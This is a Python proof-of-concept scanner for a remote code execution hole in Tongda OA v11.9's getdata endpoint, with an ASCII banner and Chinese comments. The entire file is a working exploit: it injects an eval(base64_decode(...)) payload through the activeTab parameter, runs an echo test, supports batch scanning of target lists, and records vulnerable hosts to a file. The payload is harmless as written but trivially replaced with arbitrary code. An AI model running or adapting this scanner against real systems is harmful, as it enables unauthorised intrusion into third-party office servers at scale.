# -*- coding: utf-8 -*-
# 通达OA v11.9 getdata 任意命令执行漏洞
# app="通达OA网络智能办公系统"
import argparse
import sys
import textwrap
import requests

requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 
████████╗ ██████╗ ███╗   ██╗██████╗  █████╗  ██████╗  █████╗     ██╗   ██╗ ██╗ ██╗   █████╗      ██████╗ ███████╗████████╗██████╗  █████╗ ████████╗ █████╗ 
╚══██╔══╝██╔═══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██╔══██╗    ██║   ██║███║███║  ██╔══██╗    ██╔════╝ ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗
   ██║   ██║   ██║██╔██╗ ██║██║  ██║███████║██║   ██║███████║    ██║   ██║╚██║╚██║  ╚██████║    ██║  ███╗█████╗     ██║   ██║  ██║███████║   ██║   ███████║
   ██║   ██║   ██║██║╚██╗██║██║  ██║██╔══██║██║   ██║██╔══██║    ╚██╗ ██╔╝ ██║ ██║   ╚═══██║    ██║   ██║██╔══╝     ██║   ██║  ██║██╔══██║   ██║   ██╔══██║
   ██║   ╚██████╔╝██║ ╚████║██████╔╝██║  ██║╚██████╔╝██║  ██║     ╚████╔╝  ██║ ██║██╗█████╔╝    ╚██████╔╝███████╗   ██║   ██████╔╝██║  ██║   ██║   ██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝      ╚═══╝   ╚═╝ ╚═╝╚═╝╚════╝      ╚═════╝ ╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝


                                                                        tag: This is a poc for TONDAOA v11.9 getdata arbitrary command execution hole
                                                                                                                        @version:1.0.0   @author:wuli
                                                                       """
    print(test)


def poc(target):
    url = target + "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
    }
    try:
        res = requests.post(url, headers=headers, verify=False, timeout=5).text
        if "status" in res:
            print(f"[+] {target} is vul")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} is not vul")
    except:
        print(f"[*] {target} server error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='TONDAOA v11.9 getdata arbitrary command execution hole')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        print(f"我在使用-u参数 跑单个{args.url}")
        poc(args.url)
    elif not args.url and args.file:
        print(f"我在使用-f参数 批量跑{args.file}")
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        for j in url_list:
            poc(j)
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()